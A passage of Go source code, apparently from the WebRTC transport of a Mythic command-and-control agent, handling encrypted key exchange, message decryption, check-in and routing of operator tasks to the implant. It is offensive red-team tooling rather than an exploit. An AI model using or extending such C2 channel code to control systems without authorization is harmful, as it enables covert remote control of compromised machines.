func (c *C2WebRTC) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2WebRTC) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		utils.PrintDebug("No UUID received in FinishNegotiateKey response")
		return false
	}

	// Decode the encrypted session key
	encryptedSessionKey, err := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding session key: %s", err.Error()))
		return false
	}

	// Decrypt the session key using our RSA private key
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	if len(decryptedKey) == 0 {
		utils.PrintDebug("Failed to decrypt session key")
		return false
	}

	// Save the new AES session key
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
	c.ExchangingKeys = false
	c.FinishedStaging = true
	SetAllEncryptionKeys(c.Key)

	utils.PrintDebug("Successfully finished key negotiation")
	return true
}

func (c *C2WebRTC) processMessage(data []byte) {
	utils.PrintDebug(fmt.Sprintf("processMessage - Received data of length: %d", len(data)))

	var messageWrapper Message
	err := json.Unmarshal(data, &messageWrapper)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling message: %v", err))
		return
	}

	// Decode the base64 data
	decodedData, err := base64.StdEncoding.DecodeString(messageWrapper.Data)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err))
		return
	}

	// Remove the UUID (first 36 bytes)
	if len(decodedData) < 36 {
		utils.PrintDebug("Message data too short")
		return
	}

	// Extract and decrypt the payload
	payload := decodedData[36:]
	if len(c.Key) != 0 {
		payload = c.decryptMessage(payload)
		if len(payload) == 0 {
			utils.PrintDebug("Failed to decrypt message")
			return
		}
	}

	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload length: %d", len(payload)))

	// Handle the message based on current state
	c.handleIncomingMessage(payload)
}

func (c *C2WebRTC) handleIncomingMessage(payload []byte) {
	// Handle like the websocket client does in getData()
	if c.FinishedStaging {
		// This is a normal task message - handle it
		taskResp := structs.MythicMessageResponse{}
		err := json.Unmarshal(payload, &taskResp)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v", err))
			return
		}
		utils.PrintDebug("Received task message from server - processing via push channel")
		responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
	} else {
		if c.ExchangingKeys {
			// Handle key exchange response
			if c.FinishNegotiateKey(payload) {
				utils.PrintDebug("Key exchange completed, proceeding with checkin")
				c.CheckIn()
			} else {
				utils.PrintDebug("Key exchange failed, retrying")
				c.NegotiateKey()
			}
		} else {
			// Handle checkin response
			checkinResp := structs.CheckInMessageResponse{}
			err := json.Unmarshal(payload, &checkinResp)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("handleIncomingMessage - Error unmarshaling checkin response: %v", err))
				return
			}

			if checkinResp.Status == "success" {
				SetMythicID(checkinResp.ID)
				c.FinishedStaging = true
				c.ExchangingKeys = false
				utils.PrintDebug(fmt.Sprintf("Checkin successful - Agent ID: %s, ready for push tasks", checkinResp.ID))
			} else {
				utils.PrintDebug(fmt.Sprintf("Failed to checkin, got: %s", string(payload)))
			}
		}
	}
}
